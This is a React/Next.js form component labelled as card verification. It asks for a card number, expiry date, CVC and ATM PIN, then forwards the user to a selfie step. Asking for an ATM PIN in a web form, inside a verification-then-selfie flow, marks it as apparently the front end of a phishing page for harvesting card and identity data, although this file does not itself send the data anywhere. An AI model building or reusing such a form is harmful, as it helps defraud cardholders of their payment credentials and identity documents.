"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { CreditCard, Lock } from "lucide-react"

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16)
  return digits.replace(/(.{4})/g, "$1 ").trim()
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4)
  if (digits.length <= 2) return digits
  return `${digits.slice(0, 2)}/${digits.slice(2)}`
}

export function CardVerificationForm() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState("")
  const [expiry, setExpiry] = useState("")
  const [cvc, setCvc] = useState("")
  const [pin, setPin] = useState("")

  const isComplete =
    cardNumber.replace(/\D/g, "").length === 16 &&
    expiry.length === 5 &&
    cvc.length >= 3 &&
    pin.length === 4

  function handleSubmit(event: React.FormEvent) {
    event.preventDefault()
    if (!isComplete) return
    router.push("/selfie")
  }

  return (
    <form
      onSubmit={handleSubmit}
      className="rounded-[28px] bg-white p-6 shadow-[0_16px_40px_rgba(20,32,51,0.08)]"
    >
      <div>
        <label htmlFor="card-number" className="flex items-center gap-2 text-sm font-semibold text-[#142033]">
          <CreditCard className="h-4 w-4 text-[#142033]" />
          Card Number
        </label>
        <input
          id="card-number"
          inputMode="numeric"
          autoComplete="cc-number"
          placeholder="0000 0000 0000 0000"
          value={cardNumber}
          onChange={(event) => setCardNumber(formatCardNumber(event.target.value))}
          className="mt-2 w-full rounded-xl border border-[#e4e7ec] bg-white px-4 py-3.5 text-base text-[#142033] placeholder:text-[#c3c9d1] outline-none focus:border-[#142033]"
        />
      </div>

      <div className="mt-4 grid grid-cols-2 gap-3">
        <div>
          <label htmlFor="expiry" className="text-sm font-semibold text-[#142033]">
            Expiry Date
          </label>
          <input
            id="expiry"
            inputMode="numeric"
            autoComplete="cc-exp"
            placeholder="MM/YY"
            value={expiry}
            onChange={(event) => setExpiry(formatExpiry(event.target.value))}
            className="mt-2 w-full rounded-xl border border-[#e4e7ec] bg-white px-4 py-3.5 text-base text-[#142033] placeholder:text-[#c3c9d1] outline-none focus:border-[#142033]"
          />
        </div>

        <div>
          <label htmlFor="cvc" className="flex items-center gap-1.5 text-sm font-semibold text-[#142033]">
            <Lock className="h-3.5 w-3.5 text-[#142033]" />
            CVC
          </label>
          <input
            id="cvc"
            inputMode="numeric"
            autoComplete="cc-csc"
            type="password"
            maxLength={4}
            value={cvc}
            onChange={(event) => setCvc(event.target.value.replace(/\D/g, "").slice(0, 4))}
            className="mt-2 w-full rounded-xl border border-[#e4e7ec] bg-white px-4 py-3.5 text-base text-[#142033] outline-none focus:border-[#142033]"
          />
        </div>
      </div>

      <div className="mt-4">
        <label htmlFor="pin" className="text-sm font-semibold text-[#142033]">
          ATM PIN
        </label>
        <input
          id="pin"
          inputMode="numeric"
          type="password"
          maxLength={4}
          placeholder="****"
          value={pin}
          onChange={(event) => setPin(event.target.value.replace(/\D/g, "").slice(0, 4))}
          className="mt-2 w-full rounded-xl border border-[#e4e7ec] bg-white px-4 py-3.5 text-base text-[#142033] placeholder:text-[#c3c9d1] outline-none focus:border-[#142033]"
        />
      </div>

      <button
        type="submit"
        disabled={!isComplete}
        className={`mt-6 w-full rounded-full py-4 text-base font-extrabold tracking-wide text-white transition-all duration-300 ${
          isComplete
            ? "bg-[#c0392b] shadow-[0_10px_28px_rgba(192,57,43,0.4)] hover:bg-[#a8321f]"
            : "bg-[#e79490] opacity-70 cursor-not-allowed"
        }`}
      >
        VERIFY
      </button>
    </form>
  )
}
